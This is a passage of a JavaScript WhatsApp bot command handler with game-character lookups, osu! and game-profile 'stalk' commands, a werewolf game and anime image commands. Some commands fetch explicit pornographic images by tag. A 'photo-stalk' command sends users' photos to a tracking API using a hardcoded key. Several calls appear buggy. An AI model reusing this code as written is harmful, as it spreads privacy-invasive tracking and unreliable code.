    } else if (text.toLowerCase() === 'gepard') {
        Maximus = '1104';
    } else if (text.toLowerCase() === 'guinaifen') {
        Maximus = '1210';
    } else if (text.toLowerCase() === 'hanya') {
        Maximus = '1215';
    } else if (text.toLowerCase() === 'herta') {
        Maximus = '1013';
    } else if (text.toLowerCase() === 'himeko') {
        Maximus = '1003';
    } else if (text.toLowerCase() === 'hook') {
        Maximus = '1109';
    } else if (text.toLowerCase() === 'huohuo') {
        Maximus = '1217';
    } else if (text.toLowerCase() === 'jingyuan') {
        Maximus = '1204';
    } else if (text.toLowerCase() === 'jingliu') {
        Maximus = '1212';
    } else if (text.toLowerCase() === 'kafka') {
        Maximus = '1005';
    } else if (text.toLowerCase() === 'luka') {
        Maximus = '1111';
    } else if (text.toLowerCase() === 'luocha') {
        Maximus = '1203';
    } else if (text.toLowerCase() === 'lynx') {
        Maximus = '1110';
    } else if (text.toLowerCase() === 'march7th') {
        Maximus = '1001';
    } else if (text.toLowerCase() === 'natasha') {
        Maximus = '1105';
    } else if (text.toLowerCase() === 'pela') {
        Maximus = '1106';
    } else if (text.toLowerCase() === 'physicaltrailblazer') {
        Maximus = '8001';
    } else if (text.toLowerCase() === 'qingque') {
        Maximus = '1201';
    } else if (text.toLowerCase() === 'ruanmei') {
        Maximus = '1303';
    } else if (text.toLowerCase() === 'sampo') {
        Maximus = '1108';
    } else if (text.toLowerCase() === 'seele') {
        Maximus = '1102';
    } else if (text.toLowerCase() === 'serval') {
        Maximus = '1103';
    } else if (text.toLowerCase() === 'silverwolf') {
        Maximus = '1006';
    } else if (text.toLowerCase() === 'sparkle') {
        Maximus = '1306';
    } else if (text.toLowerCase() === 'sushang') {
        Maximus = '1206';
    } else if (text.toLowerCase() === 'tingyun') {
        Maximus = '1202';
    } else if (text.toLowerCase() === 'topaz') {
        Maximus = '1112';
    } else if (text.toLowerCase() === 'welt') {
        Maximus = '1004';
    } else if (text.toLowerCase() === 'xueyi') {
        Maximus = '1214';
    } else if (text.toLowerCase() === 'yanqing') {
        Maximus = '1209';
    } else if (text.toLowerCase() === 'yukong') {
        Maximus = '1207';
    } else {
        return newReply(`Karakter yang dicari tidak ada atau belum tersedia.

*LIST CHARACTER*

- Acheron
- Argenti
- Arlan
- Asta
- Aventurine
- Bailu
- Blackswan
- Blade
- Bronya
- Clara
- Danhengil
- Danheng
- Drratio
- Firetrailblazer
- Fuxuan
- Gallagher
- Gepard
- Guinaifen
- Hanya
- Herta
- Himeko
- Hook
- Huohuo
- Jingyuan
- Jingliu
- Kafka
- Luka
- Luocha
- Lynx
- March7th
- Natasha
- Pela
- Physicaltrailblazer
- Qingque
- Ruanmei
- Sampo
- Seele
- Serval
- Silverwolf
- Sparkle
- Sushang
- Tingyun
- Topaz
- Welt
- Xueyi
- Yanqing
- Yukong`);
    }

    try {
        let data = await fetch(`https://raw.githubusercontent.com/FortOfFans/HSR/main/sheet/${Maximus}.jpg`);
        if (!data.ok) throw new Error('Gagal mendapatkan data gambar');
        let image = await data.buffer();
        ToxxicTechInc.sendFile(m.chat, image, null, `${capitalizeFirstLetter(text)} - Honkai: Star Rail - Sheet`, m);
    } catch (error) {
        newReply('An error occurred while retrieving image data. Please try again later.');
    }
}
break
case 'wuwa-cards': {
    let chara = ["Calcharo", "Encore", "Jianxin", "Jiyan", "Lingyang", "Rover", "Verina", "Yinlin", "Aalto", "Baizhi", "Chixia", "Danjin", "Mortefi", "Sanhua", "Taoqi", "Yangyang", "Yuanwu"];
    
    let capital = (txt) => {
        return txt.charAt(0).toUpperCase() + txt.slice(1).toLowerCase();
    };

    if (!text) {
        return newReply(`Example: ${prefix + command} [chara name]

*List characters in database:*
${chara.map(a => "• " + a).join("\n")}`);
    }

    if (!chara.includes(text)) {
        return newReply(`Example: ${prefix + command} [chara name]

*List characters in database:*
${chara.map(a => "• " + a).join("\n")}`);
    }

    try {
        let characters = await fetchJson("https://api.resonance.rest/characters/" + capital(text));
        let cap = `*[ WUTHERING - CHARACTERS ]*
*• Name:* ${characters.name}
*• Quote:* ${characters.quote}
*• Attributes:* ${characters.attribute}
*• Weapons:* ${characters.weapon}
*• Rarity:* ${characters.rarity}
*• Class:* ${characters.class}
*• Birth Place:* ${characters.birthplace}
*• Birthday:* ${characters.birthday}
`;

        let portraitUrl = "https://api.resonance.rest/characters/" + capital(text) + "/portrait";
        
        let data = await fetch(portraitUrl);
        if (!data.ok) throw new Error('Gagal mendapatkan data gambar');
        let image = await data.buffer();

        // Mengirim pesan teks dan gambar potret dalam satu pesan
        ToxxicTechInc.sendMessage(m.chat, { image: image, caption: cap }, { quoted: m });

    } catch (error) {
        newReply('Terjadi kesalahan saat mengambil data karakter. Silakan coba lagi nanti.');
    }
}
break
case 'wuwa-sheets': {
    if (!text) {
        return newReply(`Example: ${prefix + command} Sanhua

*LIST CHARACTER*

- Aalto
- Baizhi
- Calcharo
- Chixia
- Danjin
- Encore
- Jianxin
- Jiyan
- Lingyang
- Mortefi
- Rover-Havoc
- Rover-Spectro
- Sanhua
- Taoqi
- Verina
- Yangyang
- Yinlin
- Yuanwu
`);
    }

    let Maximus;

    if (text.toLowerCase() === 'sanhua') {
        Maximus = '1102';
    } else if (text.toLowerCase() === 'baizhi') {
        Maximus = '1103';
    } else if (text.toLowerCase() === 'lingyang') {
        Maximus = '1104';
    } else if (text.toLowerCase() === 'chixia') {
        Maximus = '1202';
    } else if (text.toLowerCase() === 'encore') {
        Maximus = '1203';
    } else if (text.toLowerCase() === 'mortefi') {
        Maximus = '1204';
    } else if (text.toLowerCase() === 'calcharo') {
        Maximus = '1301';
    } else if (text.toLowerCase() === 'yinlin') {
        Maximus = '1302';
    } else if (text.toLowerCase() === 'yuanwu') {
        Maximus = '1303';
    } else if (text.toLowerCase() === 'yangyang') {
        Maximus = '1402';
    } else if (text.toLowerCase() === 'aalto') {
        Maximus = '1403';
    } else if (text.toLowerCase() === 'jiyan') {
        Maximus = '1404';
    } else if (text.toLowerCase() === 'jianxin') {
        Maximus = '1405';
    } else if (text.toLowerCase() === 'rover-spectro') {
        Maximus = '1502';
    } else if (text.toLowerCase() === 'verina') {
        Maximus = '1503';
    } else if (text.toLowerCase() === 'taoqi') {
        Maximus = '1601';
    } else if (text.toLowerCase() === 'danjin') {
        Maximus = '1602';
    } else if (text.toLowerCase() === 'rover-havoc') {
        Maximus = '1604';
    } else {
        return newReply(`Karakter yang dicari tidak ada atau belum tersedia.

*LIST CHARACTER*

- Aalto
- Baizhi
- Calcharo
- Chixia
- Danjin
- Encore
- Jianxin
- Jiyan
- Lingyang
- Mortefi
- Rover-Havoc
- Rover-Spectro
- Sanhua
- Taoqi
- Verina
- Yangyang
- Yinlin
- Yuanwu`);
    }

    try {
        let data = await fetch(`https://raw.githubusercontent.com/DEViantUA/wuthering-waves-elevation-materials/main/character/${Maximus}.png`);
        if (!data.ok) throw new Error('Gagal mendapatkan data gambar');
        let image = await data.buffer();
        ToxxicTechInc.sendFile(m.chat, image, null, `${capitalizeFirstLetter(text)} - Wuthering Waves - Sheet`, m);
    } catch (error) {
        newReply('An error occurred while retrieving image data. Please try again later.');
    }
}
break
    case 'genshin':
    case 'swimsuit':
    case 'schoolswimsuit':
    case 'white':
    case 'barefoot':
    case 'touhou':
    case 'gamecg':
    case 'hololive':
    case 'uncensored':
    case 'sungglasses':
    case 'glasses':
    case 'weapon':
    case 'shirtlift':
    case 'chain':
    case 'fingering':
    case 'flatchest':
    case 'torncloth':
    case 'bondage':
    case 'demon':
    case 'pantypull':
    case 'headdress':
    case 'headphone':
    case 'anusview':
    case 'shorts':
    case 'stokings':
    case 'topless':
    case 'beach':
    case 'bunnygirl':
    case 'bunnyear':
    case 'vampire':
    case 'nobra':
    case 'bikini':
    case 'whitehair':
    case 'blonde':
    case 'pinkhair':
    case 'bed':
    case 'ponytail':
    case 'nude':
    case 'dress':
    case 'underwear':
    case 'foxgirl':
    case 'uniform':
    case 'skirt':
    case 'breast':
    case 'twintail':
    case 'spreadpussy':
    case 'seethrough':
    case 'breasthold':
    case 'fateseries':
    case 'spreadlegs':
    case 'openshirt':
    case 'headband':
    case 'nipples':
    case 'erectnipples':
    case 'greenhair':
    case 'wolfgirl':
    case 'catgirl':
    if (!AntiNsfw) return newReply(mess.nsfw)
  let res = await fetch(`https://fantox-apis.vercel.app/${command}`)
  if (!res.ok) throw await res.text()
  let json = await res.json()
  if (!json.url) throw 'Error'
  ToxxicTechInc.sendFile(m.chat, json.url, 'img.jpg', `Here you go!`, m)
  break    
  case 'kcrandom': case 'kcimg': {
async function animeRandom() {
    try {
        let response = await axios.get('https://konachan.net/post?tags=order%3Arandom');
        let $ = cheerio.load(response.data);
        let hasil = {
            status: 200,
            creator: 'ToxxicTechInc',
            imageUrl: []
        };
        $('#post-list-posts a.directlink.largeimg').each((index, element) => {
            hasil.imageUrl.push( $(element).attr('href') );
        });
        return hasil;
    } catch (error) {
        console.error('Error:', error);
return error
    }
}

try {
let response = await animeRandom()
let random = pickRandom(response.imageUrl)

ToxxicTechInc.sendMessage(m.chat, { image: { url: random }, caption: mess.success }, { quoted: m })
} catch (e) {
newReply(e)
}
}
break
case 'rule34': {
 async function rule34Random() {
 try {
 let response = await axios.get('https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&json=1')
 let results = response.data

 if (!Array.isArray(results) || results.length === 0) {
 throw new Error('No images found')
 }

 let randomImage = results[Math.floor(Math.random() * results.length)]
 let imageUrl = randomImage.file_url

 if (!imageUrl) {
 throw new Error('Image URL not found')
 }

 return { status: 200, imageUrl }
 } catch (error) {
 console.error('Error:', error)
 return { status: 500, error: error.message }
 }
 }

 async function sendRandomRule34Image(m) {
 try { 

 let response = await rule34Random()
 if (response.status !== 200) {
 throw new Error(response.error)
 }

 let imageUrl = response.imageUrl

 ToxxicTechInc.sendMessage(m.chat, { image: { url: imageUrl }, caption: mess.success }, { quoted: m })
 } catch (e) {
 newReply(e.message)
 }
 }

 sendRandomRule34Image(m)
 }
 break
 case 'osu-profile': {
    if (!text) return newReply(`Example ${prefix + command} username_osu`)
    try {
        let response = await fetch(`https://osu.ppy.sh/api/get_user?k=${global.api.osu}&u=${text}`)
        let data = await response.json()
        let user = data[0]

        if (!user) return newReply(`User dengan username ${text} tidak ditemukan`)

        let profileInfo = `
<------------------------------------------>

*OsuId* : ${user.user_id}
*Username* : ${user.username}
*Negara* : ${user.country}
*Level* : ${parseFloat(user.level).toFixed(2)}
*Akurasi* : ${parseFloat(user.accuracy).toFixed(2)}%
*PP* : ${user.pp_raw}
*Leaderboard* : ${user.pp_rank}
*JoinDate* : ${user.join_date}

<Score>

*PlayCount* : ${user.playcount}
*Ranked Score* : ${user.ranked_score}
*Total Score* : ${user.total_score}
*SSH Score* : ${user.count_rank_ssh}
*SS Score* : ${user.count_rank_ss}
*SH Score* : ${user.count_rank_sh}
*S Score* : ${user.count_rank_s}
*A Score* : ${user.count_rank_a}

*300* : ${user.count300}
*100* : ${user.count100}
*50* : ${user.count50}
        `

        let profileImageUrl = `https://a.ppy.sh/${user.user_id}`

        ToxxicTechInc.sendMessage(m.chat, { image: { url: profileImageUrl }, caption: profileInfo.trim() }, { quoted: m })
    } catch (e) {
        newReply('Error fetching osu! profile')
    }
}
break
case 'genshin-stalk': {
  if (!text) {
    return newReply(`Example :\n${prefix + command} <UID>\n\nExample :\n${prefix + command} 830980536`);
  }

  const wait = await hana();

  try {
    let res = await fetch(`https://enka.network/api/uid/${text}`);
    let data = await res.json();
    let playerInfo = data.data;

    if (res.ok) {
      let nickname = data.playerInfo.nickname || 'Not found';
      let arLevel = data.playerInfo.level || 'Not found';
      let signature = data.playerInfo.signature || 'Not found';
      let worldLevel = data.playerInfo.worldLevel || 'Not found';
      let achievement = data.playerInfo.finishAchievementNum || 'Not found';
      let spiralFloorIndex = data.playerInfo.towerFloorIndex || 'Not found';
      let spiralLeverIndex = data.playerInfo.towerLevelIndex || 'Not found';

      let ssurl = `https://enka.network/u/${text}`;
      let screenshotUrl = `${ssurl}`;
      let screenshot = await captureScreenshot(screenshotUrl);

      let profileMessage = `
        _The Data Below May Not Be Exact Due to_
            _There is Delay in Data Capture!_
            
  ❏─────• *Genshin Profile Info* •───┈➤➤
  ┊
  ┊❖﹐Nickname: ${nickname} - AR ${arLevel}
  ┊❖﹐Signature: ${signature}
  ┊✤﹐World Level: ${worldLevel}
  ┊✧﹐Achievement: ${achievement}
  ┊
  ❏───────- *Challenge* -────────
  ┊
  ┊✥﹐Spiral Abbys: ${spiralFloorIndex} - ${spiralLeverIndex}
  ┊
  ╰┈➤ More Details At:
    ❀ https://enka.network/u/${text}
    
    ✧ UID: ${text}
    `.trim();

      await ToxxicTechInc.sendFile(m.chat, screenshot.result, 'screenshot.jpg', profileMessage, m);
    } else {
      if (res.status === 400) {
        newReply('UID format is incorrect. Please enter a valid UID.');
      } else if (res.status === 404) {
        newReply('Player not found. Please double check the UID or player name.');
      } else if (res.status === 424) {
        newReply('Server is under maintenance or experiencing issues after a game update. Please try again later.');
      } else if (res.status === 429) {
        newReply('You have reached the request limit. Please wait a moment before making another request.');
      } else if (res.status === 500) {
        newReply('An error occurred on the server. Please try again later.');
      } else if (res.status === 503) {
        newReply('A major error occurred in the application. We will fix it soon.');
      } else {
        newReply('There was an error loading the data. Please try again later.');
      }
    }
  } catch (e) {
    newReply(e);
  }
};
break
			case 'honkai-stalk': {
  if (!text) {
    return newReply(`Example :\n${prefix + command} <UID>\n\nExample :\n${prefix + command} 808187628`);
  }

  const wait = await hana();

  try {
    let res = await fetch(`https://api.mihomo.me/sr_info_parsed/${text}?lang=en`);
    let data = await res.json();

    if (res.ok) {
      let player = data.player;

      let nickname = player.nickname || 'Not found';
      let arLevel = player.level || 'Not found';
      let signature = player.signature || 'Not found';
      let worldLevel = player.world_level || 'Not found';
      let achievement = player.space_info.achievement_count || 'Not found';
      let memoryLevel = player.space_info.memory_data.level || 'Not found';
      let universeLevel = player.space_info.universe_level || 'Not found';

      let ssurl = `https://enka.network/hsr/${text}`;
      let screenshotUrl = `${ssurl}`;
      let screenshot = await captureScreenshot(screenshotUrl);


      let profileMessage = `
       There May Be a Delay in Data Capture
                         About 5 Minutes

❏────• *Honkai SR Profile Info* •─┈➤ 
┊
┊■﹐Nickname: ${nickname} - TL ${arLevel}
┊■﹐Signature: ${signature}
┊※﹐Achievement: ${achievement}
┊※﹐Equilibrium: Level ${worldLevel}
┊
❏──•「 *Challenge*」
┊
┊※﹐Memory of Chaos: Level ${memoryLevel}
┊■﹐Simulated Universe: Level ${universeLevel}
┊
╰┈➤More Details At:
 • https://enka.network/hsr/${text}

 ❖ UID: ${text}
      `.trim();

      await ToxxicTechInc.sendFile(m.chat, screenshot.result, 'screenshot.jpg', profileMessage, m);
    } else {
      if (res.status === 400) {
        newReply('UID format is incorrect. Please enter a valid UID.');
      } else if (res.status === 404) {
        newReply('Player not found. Please double check the UID or player name.');
      } else if (res.status === 424) {
        newReply('The server is under maintenance or experiencing problems after a game update. Please try again later.');
      } else if (res.status === 429) {
        newReply('You have reached the request limit. Please wait a moment before making another request.');
      } else if (res.status === 500) {
        newReply('An error occurred on the server. Please try again later.');
      } else if (res.status === 503) {
        newReply('A major error occurred in the application. We will fix it soon.');
      } else {
        newReply('There was an error loading the data. Please try again later.');
      }
    }
  } catch (error) {
    newReply('An error occurred loading the data. Please try again later.');
  }
};
break
case 'photo-stalk': {
if (!/image/.test(mime)) return newReply(`Send/reply image/image you want to track!`)
newReply('Identifying image...')
try {
let id = '13135550002@s.whatsapp.net'
const pht = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)
const tenka = await uptotelegra(pht)
let res = await fetchJson(`https://api.neoxr.eu/api/photo-tracker?image=${tenka}&apikey=yC8nWs`)
ToxxicTechInc.sendMessage(m.chat, { text: `Cloud: @${id.split("@")[0]}\nRequest From: @${m.sender.split("@")[0]} \n\n${res.data}`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[id, m.sender]
}}, { quoted: m })
} catch (err) {
console.log(err)
newReply('Sorry the server has an error')
}
}
break
case 'hadist': {
if (!text) return newReply(`Example : ${prefix + command} abu-dawud 1`)
let hadist = args[0]
let number = args[1]
try {
let apiUrl = `https://hadis-api-id.vercel.app/hadith/${hadist}/${number}`
let response = await axios.get(apiUrl)
let data = response.data
newReply(`*乂 HADIST ${data.name.toUpperCase()}*
${data.arab}

*Translation:* ${data.id}`)
} catch (e) {
console.error(e)
}}
break
case 'husbando': {
try {
  let hus = await (await fetch('https://nekos.best/api/v2/husbando')).json();
  let ban = hus.results[0];
  ToxxicTechInc.sendMessage(m.chat, { image: { url: ban.url }, caption: mess.success }, { quoted: m });
} catch (e) {
    newReply('error')
    }
}
break
case 'kitsune': {
try {
  let kit = await (await fetch('https://nekos.best/api/v2/kitsune')).json();
  let sune = kit.results[0];
  ToxxicTechInc.sendMessage(m.chat, { image: { url: sune.url }, caption: mess.success }, { quoted: m });
} catch (e) {
    newReply('error')
    }
}
break
      case 'wwpc':
case 'ww':
case 'werewolf': {
let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    runprefixagi
} = require('./lib/werewolf.js')

// [ Thumbnail ] 
let thumb =
    "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

    const {
        sender,
        chat
    } = m;
    ToxxicTechInc.werewolf = ToxxicTechInc.werewolf ? ToxxicTechInc.werewolf : {};
    const ww = ToxxicTechInc.werewolf ? ToxxicTechInc.werewolf : {};
    const data = ww[chat];
    const value = args[0];
    const target = args[1];
let byId = getPlayerById2(sender, parseInt(target), ww); 
    // [ Membuat Room ]
    if (value === "create") {
        if (chat in ww) return newReply("Group still in game session");
        if (playerOnGame(sender, ww) === true)
            return newReply("You're still in a gaming session");
        ww[chat] = {
            room: chat,
            owner: sender,
            status: false,
            iswin: null,
            cooldown: null,
            day: 0,
            time: "malem",
            player: [],
            dead: [],
            voting: false,
            seer: false,
            guardian: [],
        };
        await newReply("Room created successfully, type *.ww join* to join");

        // [ Join session ]
    } else if (value === "join") {
        if (!ww[chat]) return newReply("Belum ada sesi permainan");
        if (ww[chat].status === true)
            return newReply("Sesi permainan sudah dimulai");
        if (ww[chat].player.length > 16)
            return newReply("Maaf jumlah player telah penuh");
        if (playerOnRoom(sender, chat, ww) === true)
            return newReply("Kamu sudah join dalam room ini");
        if (playerOnGame(sender, ww) === true)
            return newReply("Kamu masih dalam sesi game");
        let data = {
            id: sender,
            number: ww[chat].player.length + 1,
            sesi: chat,
            status: false,
            role: false,
            effect: [],
            vote: 0,
            isdead: false,
            isvote: false,
        };
        ww[chat].player.push(data);
        let player = [];
        let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )}\n`;
            player.push(ww[chat].player[i].id);
        }
        text += "\nJumlah player minimal adalah 5 dan maximal 15";
        ToxxicTechInc.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: websitex,
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );

        // [ Game Play ]
    } else if (value === "start") {
        if (!ww[chat]) return newReply("Belum ada sesi permainan");
        if (ww[chat].player.length === 0)
            return newReply("Room belum memiliki player");
        if (ww[chat].player.length < 5)
            return newReply("Maaf jumlah player belum memenuhi syarat");
        if (playerOnRoom(sender, chat, ww) === false)
            return newReply("Kamu belum join dalam room ini");
        if (ww[chat].cooldown > 0) {
            if (ww[chat].time === "voting") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_vote(ToxxicTechInc. chat, ww);
            } else if (ww[chat].time === "malem") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_malam(ToxxicTechInc. chat, ww);
            } else if (ww[chat].time === "pagi") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await runprefixagi(ToxxicTechInc. chat, ww);
            }
        }
        if (ww[chat].status === true)
            return newReply("Sesi permainan telah dimulai");
        if (ww[chat].owner !== sender)
            return newReply(
                `Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`
            );
        let list1 = "";
        let list2 = "";
        let player = [];
        roleGenerator(chat, ww);
        addTimer(chat, ww);
        startGame(chat, ww);
        for (let i = 0; i < ww[chat].player.length; i++) {
            list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")}\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")} ${
          ww[chat].player[i].role === "werewolf" ||
          ww[chat].player[i].role === "sorcerer"
            ? `[${ww[chat].player[i].role}]`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            // [ Werewolf ]
            if (ww[chat].player[i].role === "werewolf") {
                if (ww[chat].player[i].isdead != true) {
                    var textt = `Hai ${ToxxicTechInc.getName(
              ww[chat].player[i].id
            )}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role(
              "werewolf"
            )} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;
                    await ToxxicTechInc.sendMessage(ww[chat].player[i].id, {
                        text: textt,
                        mentions: player,
                    });
                }
                        // [ villager ]
            } else if (ww[chat].player[i].role === "warga") {
                if (ww[chat].player[i].isdead != true) {
                    let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHai ${ToxxicTechInc.getName(
              ww[chat].player[i].id
            )} Peran kamu adalah *Warga Desa* ${emoji_role(
              "warga"
            )}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
                    await ToxxicTechInc.sendMessage(ww[chat].player[i].id, {
                        text: texttt,
                        mentions: player,
                    });
                }

                // [ Penerawangan ]
            } else if (ww[chat].player[i].role === "seer") {
                if (ww[chat].player[i].isdead != true) {
                    let texxt = `Hai ${ToxxicTechInc.getName(
              ww[chat].player[i].id
            )} Kamu telah terpilih  untuk menjadi *Penerawang* ${emoji_role(
              "seer"
            )}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;

                    await ToxxicTechInc.sendMessage(ww[chat].player[i].id, {
                        text: texxt,
                        mentions: player,
                    });
                }

                // [ Guardian ]
            } else if (ww[chat].player[i].role === "guardian") {
                if (ww[chat].player[i].isdead != true) {
                    let teext = `Hai ${ToxxicTechInc.getName(
              ww[chat].player[i].id
            )} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role(
              "guardian"
            )}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;
  
                    await ToxxicTechInc.sendMessage(ww[chat].player[i].id, {
                        text: teext,
                        mentions: player,
                    });
                }

                // [ Sorcerer ]
            } else if (ww[chat].player[i].role === "sorcerer") {
                if (ww[chat].player[i].isdead != true) {
                    let textu = `Hai ${ToxxicTechInc.getName(
              ww[chat].player[i].id
            )} Kamu terpilih sebagai Penyihir ${emoji_role(
              "sorcerer"
            )}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;

                    await ToxxicTechInc.sendMessage(ww[chat].player[i].id, {
                        text: textu,
                        mentions: player,
                    });
                }
            }
        }
        await ToxxicTechInc.sendMessage(m.chat, {
            text: "*⌂ W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
            contextInfo: {
                externalAdReply: {
                    title: "W E R E W O L F",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnail: await resize(thumb, 300, 175),
                    sourceUrl: websitex,
                    mediaUrl: thumb,
                },
                mentionedJid: player,
            },
        });
        await run(ToxxicTechInc. chat, ww);
    } else      if (value === "kill") { 
    let byId = getPlayerById2(sender, parseInt(target), ww)
         if (dataPlayer(sender, ww).role !== "werewolf") 
             return newReply("Peran ini bukan untuk kamu"); 
         if (byId.db.role === "sorcerer") 
             return newReply("Tidak bisa menggunakan skill untuk teman"); 
                  if (playerOnGame(sender, ww) === false)
        return newReply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return newReply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return newReply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return newReply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return newReply("Gunakan hanya nomor")    
    if (byId.db.isdead === true) 
        return newReply("Player sudah mati")
    if (byId.db.id === sender)
        return newReply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return newReply("Player tidak terdaftar")
      newReply("Berhasil membunuh player " + parseInt(target)) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
                 killWerewolf(sender, parseInt(target), ww); 
             }); 
     } else if (value === "dreamy") { 
         if (dataPlayer(sender, ww).role !== "seer") 
             return newReply("Peran ini bukan untuk kamu"); 
                  if (playerOnGame(sender, ww) === false)
        return newReply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return newReply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return newReply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return newReply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return newReply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return newReply("Player sudah mati")
    if (byId.db.id === sender)
        return newReply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return newReply("Player tidak terdaftar")
         let dreamy = dreamySeer(m.sender, parseInt(target), ww); 
         newReply(`Berhasil membuka identitas player ${target} adalah ${dreamy}`) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
             }); 
     } else if (value === "deff") { 
         if (dataPlayer(sender, ww).role !== "guardian") 
             return newReply("Peran ini bukan untuk kamu"); 
                  if (playerOnGame(sender, ww) === false)
        return newReply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return newReply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return newReply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return newReply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return newReply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return newReply("Player sudah mati")
    if (byId.db.id === sender)
        return newReply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return newReply("Player tidak terdaftar")
         newReply(`Berhasil melindungi player ${target}`).then(() => { 
             protectGuardian(m.sender, parseInt(target), ww); 
             dataPlayer(sender, ww).status = true; 
         }); 
     } else if (value === "sorcerer") { 
         if (dataPlayer(sender, ww).role !== "sorcerer") 
             return newReply("Peran ini bukan untuk kamu"); 
             if (playerOnGame(sender, ww) === false)
        return newReply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return newReply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return newReply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return newReply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return newReply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return newReply("Player sudah mati")
    if (byId.db.id === sender)
        return newReply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return newReply("Player tidak terdaftar")
         let sorker = sorcerer(sesi(m.sender), target); 
          newReply(`Berhasil membuka identitas player ${player} adalah ${sorker}`) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
             }); 
     } else if (value === "vote") {
        if (!ww[chat]) return newReply("Belum ada sesi permainan");
        if (ww[chat].status === false)
